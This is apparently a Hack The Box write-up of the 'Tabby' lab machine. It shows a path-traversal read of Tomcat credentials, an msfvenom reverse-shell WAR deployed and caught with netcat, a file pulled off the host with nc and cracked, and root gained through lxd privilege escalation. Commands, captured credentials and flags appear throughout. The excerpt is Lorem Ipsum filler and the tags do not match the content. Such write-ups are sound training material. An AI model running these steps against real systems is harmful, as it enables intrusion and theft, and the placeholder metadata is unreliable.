---
layout: single
title: Tabby - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-07-06
classes: wide
header:
  teaser: /assets/images/htb-writeup-tabby/tabby_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-tabby/tabby_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@nidus:/git/htb# nmap -Pn -sC -sV -n 10.10.10.194
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 00:47 CEST
    Nmap scan report for 10.10.10.194
    Host is up (0.038s latency).
    Not shown: 997 closed ports
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
    80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Mega Hosting
    8080/tcp open  http    Apache Tomcat
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-title: Apache Tomcat
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


    DIRB:
    + http://10.10.10.194:8080/docs (CODE:302|SIZE:0)
    + http://10.10.10.194:8080/examples (CODE:302|SIZE:0)
    + http://10.10.10.194:8080/host-manager (CODE:302|SIZE:0)
    + http://10.10.10.194:8080/index.html (CODE:200|SIZE:1895)
    + http://10.10.10.194:8080/manager (CODE:302|SIZE:0)

    NIKTO:
    -


2. Visiting the webpage on port 80 we directly find;
    - Hostname megahosting.htb
    - The site is also made with Bootstrap Themes from 2016
    - Information about a breach linking to http://megahosting.htb/news.php?file=statement


3. Adding megahosting.htb to /etc/hosts we are able to read their statement. Looking at the URI it looks vulnerable to LFI, testing
   this proves that that's the case - instead of reading the file 'statement' we can read '../../../../../etc/passwd'.

   Reading the passwd-file we find the user Ash;
    ash:x:1000:1000:clive:/home/ash:/bin/bash

   On the port 8080 webserver we find a Tomcat9 server with a admin login prompt. Using the found LFI we can enumerate the tomcat
   server and look for credentials. To find the file structure I installed tomcat9 locally and enumerated the directories locally;

   root@nidus:/usr/share/tomcat9# tree
    .
    ..
    ├── etc
    │   ├── server.xml
    │   ├── tomcat-users.xml
    │   └── web.xml

    We find the user configuration file under /usr/share/tomcat9/etc/tomcat-users.xml. Curling this through our LFI gives us;

    root@nidus:/git/htb/tabby# curl http://megahosting.htb/news.php?file=../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
      ..
         <role rolename="admin-gui"/>
         <role rolename="manager-script"/>
         <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
      </tomcat-users>

    CREDENTIALS - tomcat:$3cureP4s5w0rd123!


4. Reading through the Tomcat documentation tells us that if we have access to the host-manager, we are able to add, remove and
   manage Virtual Hosts through curl.

   We create a malicious payload:
   root@nidus:/git/htb/tabby# msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.44 lport=4488 -f war > rev-shell.war
    Payload size: 1086 bytes
    Final size of war file: 1086 bytes

   Upload the shell:
   root@nidus:/git/htb/tabby# curl -u 'tomcat':'$3cureP4s5w0rd123!' -T rev.war 'http://10.10.10.194:8080/manager/text/deploy?path=/rev-shell'
    OK - Deployed application at context path [/rev-shell]

   List Deployed Shell:
   root@nidus:/git/htb/tabby# curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list
    OK - Listed applications for virtual host [localhost]
    /:running:0:ROOT
    /examples:running:0:/usr/share/tomcat9-examples/examples
    /host-manager:running:0:/usr/share/tomcat9-admin/host-manager
    /rev-shell:running:0:rev-shell
    /manager:running:0:/usr/share/tomcat9-admin/manager
    /docs:running:0:/usr/share/tomcat9-docs/docs

   Execute Deployed Shell:
   root@nidus:/git/htb/tabby# curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/rev-shell/

   root@nidus:/usr/share/tomcat9# nc -lvnp 4488
    listening on [any] 4488 ...
    connect to [10.10.14.44] from (UNKNOWN) [10.10.10.194] 45912
    whoami
    tomcat


5. Enumerating using linpeas we find a suspicious zip-file that is password protected. We are unable to open it using the found
   password, so instead I think we might be able to brute force it. Transfer the file over to your local computer using nc.

   tomcat@tabby:/dev/shm$ ./linpeas.sh
     ..
     [+] Backup files?
     -rw-r--r-- 1 ash ash 8716 Jun 16 13:42 /var/www/html/files/16162020_backup.zip

   Start listener locally:
    root@nidus:/git/htb/tabby# nc -lp 4433 > 16162020_backup.zip

   Transfer the file from Victim Host:
    tomcat@tabby:/var/www/html/files$ nc -w3 10.10.14.44 4433 < 16162020_backup.zip

   Crack the file using fcrackzip:
    root@nidus:/git/htb/tabby# fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
      possible pw found: admin@it ()


6. We are now able to change to user ash:admin@it and grab user.txt

    tomcat@tabby:/var/www/html/files$ su ash
      Password: admin@it
    ash@tabby:/var/www/html/files$ cd /home/ash/
    ash@tabby:~$ cat user.txt
      3f11605318e3590cea5082935ac8d9cb


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Running Linpeas as Ash we see a, for me, unknown group - lxd. Googling for lxd privesc I find a short article explaining that
   that this is possible with a few short steps.

    ====================================( Basic information )=====================================
    ..
    User & Groups: uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)


2. Download lxd alpine builder and build it LOCALLY before pushing it over to the vicitm.

    root@nidus:/git/htb/tabby# git clone https://github.com/saghul/lxd-alpine-builder.git
    root@nidus:/git/htb/tabby# cd lxd-alpine-builder/
    root@nidus:/git/htb/tabby/lxd-alpine-builder# ./build-alpine

   A tar.gz-file is created that we can push/pull to the victim.
   root@nidus:/git/htb/tabby/lxd-alpine-builder# ls -al
    -rw-r--r-- 1 root root 3195037 Jul  6 16:56 alpine-v3.12-x86_64-20200706_1656.tar.gz


3. Pull the tar.gz-file and import it as an image. Mount to a container and profit, root taken.

    ash@tabby:~$ wget http://10.10.14.44:8181/alpine-v3.12-x86_64-20200706_1656.tar.gz
    ash@tabby:~$ lxc image import ./alpine-v3.12-x86_64-20200706_1656.tar.gz --alias p3-image
      If this is your first time running LXD on this machine, you should also run: lxd init
      To start your first instance, try: lxc launch ubuntu:18.04

  If you started the box yourself, or no one has run lxd yet - write 'lxd init' and just press enter to access all default values.

    ash@tabby:~$ lxc image list
      +----------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
      |  ALIAS   | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE         |
      +----------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
      | p3-image | a17d99462fda | no     | alpine v3.12 (20200706_16:56) | x86_64       | CONTAINER | 3.05MB | Jul 6, 2020 at 1:18pm (UTC) |
      +----------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+

   Continue to add a device and select the folder(s) you'd like to mount. In our case we mount the entire box (/) to /mnt/root.

    ash@tabby:~$ lxc init p3-image ignite -c security.privileged=true
      Creating ignite
    ash@tabby:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
      Device mydevice added to ignite
    ash@tabby:~$ lxc start ignite
    ash@tabby:~$ lxc exec ignite /bin/sh
    ~ # id
      uid=0(root) gid=0(root)
    ~ # cd /mnt/root/root/
    /mnt/root/root # cat root.txt
      67667b1756a9729b7fadc7f7315019b9



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

TomCat; Add, Remove, Manage:
  https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_a_Directory_or_WAR_by_URL

lxd PrivEsc:
  https://www.hackingarticles.in/lxd-privilege-escalation/
